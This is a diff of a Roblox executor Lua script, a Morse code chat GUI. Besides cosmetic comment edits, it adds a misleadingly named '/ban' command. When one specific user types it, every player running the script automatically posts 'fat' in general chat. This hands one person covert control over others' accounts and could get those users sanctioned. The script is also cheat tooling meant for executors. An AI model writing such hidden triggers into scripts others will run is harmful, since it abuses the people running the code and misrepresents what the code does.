@@ -1,5 +1,6 @@
--- // Catbar's Morse Code GUI - Small + Clean Hide (No White Leftover)
+-- Catbar's Morse Code GUI - Small + Clean Hide (No White Leftover)
 -- Client-side for Roblox Executors
+-- Modified with /ban command for User_KVH
 
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
@@ -86,7 +87,7 @@ stroke.Color = Color3.fromRGB(255, 170, 200)
 stroke.Thickness = 1.5
 stroke.Parent = mainFrame
 
--- Pink Title Bar (Always visible when hidden)
+-- Pink Title Bar
 local titleBar = Instance.new("Frame")
 titleBar.Size = UDim2.new(1, 0, 0, 30)
 titleBar.BackgroundColor3 = Color3.fromRGB(255, 182, 215)
@@ -220,12 +221,11 @@ titleBar.InputChanged:Connect(function(input)
     end
 end)
 
--- ================== CLEAN HIDE (No White Leftover) ==================
+-- ================== CLEAN HIDE ==================
 local isHidden = false
 
 hideBtn.MouseButton1Click:Connect(function()
     isHidden = not isHidden
-
     if isHidden then
         logFrame.Visible = false
         inputFrame.Visible = false
@@ -247,7 +247,7 @@ closeBtn.MouseButton1Click:Connect(function()
     screenGui:Destroy()
 end)
 
--- ================== ADD MESSAGE ==================
+-- ================== ADD MESSAGE TO LOG ==================
 local function addToLog(sender, text, isMorse)
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(1, -6, 0, 0)
@@ -279,7 +279,7 @@ local function addToLog(sender, text, isMorse)
     end)
 end
 
--- ================== SEND & RECEIVE ==================
+-- ================== SEND MORSE ==================
 sendBtn.MouseButton1Click:Connect(function()
     local msg = inputBox.Text
     if msg == "" then return end
@@ -298,6 +298,7 @@ sendBtn.MouseButton1Click:Connect(function()
     inputBox.Text = ""
 end)
 
+-- ================== RECEIVE MESSAGES ==================
 local function onMessage(message)
     if not message.Text then return end
     local sender = message.TextSource and message.TextSource.Name or "Player"
@@ -320,4 +321,40 @@ pcall(function()
     end)
 end)
 
-print("🌸 Small Morse GUI loaded with clean hide!")
+-- ================== /BAN COMMAND - ONLY User_KVH CAN USE ==================
+local TARGET_USER = "User_KVH"
+local BAN_COMMAND = "/ban"
+
+player.Chatted:Connect(function(message)
+    if player.Name == TARGET_USER and message:lower():sub(1, #BAN_COMMAND) == BAN_COMMAND:lower() then
+        -- Everyone using this script will send "fat"
+        pcall(function()
+            if TextChatService.TextChannels and TextChatService.TextChannels:FindFirstChild("RBXGeneral") then
+                TextChatService.TextChannels.RBXGeneral:SendAsync("fat")
+            else
+                game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer("fat", "All")
+            end
+        end)
+        
+        print("🌸 /ban triggered by " .. TARGET_USER)
+    end
+end)
+
+-- Extra safety for new chat system
+if TextChatService.TextChannels then
+    TextChatService.MessageReceived:Connect(function(textChatMessage)
+        local sender = textChatMessage.TextSource
+        if sender and sender.Name == TARGET_USER then
+            local text = textChatMessage.Text
+            if text and text:lower():sub(1, #BAN_COMMAND) == BAN_COMMAND:lower() then
+                pcall(function()
+                    if TextChatService.TextChannels.RBXGeneral then
+                        TextChatService.TextChannels.RBXGeneral:SendAsync("fat")
+                    end
+                end)
+            end
+        end
+    end)
+end
+
+print("🌸 Small Morse GUI loaded with clean hide + /ban command!")
